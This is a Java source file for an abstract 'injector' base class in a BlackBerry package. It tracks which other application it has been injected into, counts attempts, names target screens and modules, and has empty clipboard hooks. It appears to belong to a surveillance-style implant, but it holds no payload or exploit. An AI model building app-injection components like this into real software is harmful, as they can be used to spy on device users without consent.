package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public abstract class AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Injector", DebugLevel.VERBOSE);
    //#endif
    private UiApplication injectedApp = null;
    private int tries=0;
    protected boolean enabled=true;
    
    public abstract String getAppName();
    public abstract String getCodName();
    public abstract String[] getWantedScreen();
    public abstract void playOnScreen(Screen screen);
    
    public boolean enabled(){
        return  enabled;
    }
    
    public final void disable() {
        enabled=false;
    }
    
    public void incrTries(){
        tries++;
    }
    
    public int getTries(){
        return tries;
    }
    
    public void resetTries(){
        tries=0;
    }
    
    public void setInjectedApp(UiApplication app) {
        //#ifdef DEBUG
        debug.trace("setInjectedApp: INJECTED");
        //#endif
        this.injectedApp = app;
    }

    public UiApplication getInjectedApp() {
        return injectedApp;
    }
    
    public boolean isInjected(){
        return injectedApp!=null;
    }

    protected void disableClipboard() {
        // TODO Auto-generated method stub 
    }
    
    protected void enableClipboard() {
        // TODO Auto-generated method stub 
    }
    
    protected void setClipboard(Object object) {
        // TODO Auto-generated method stub 
    }
    
}
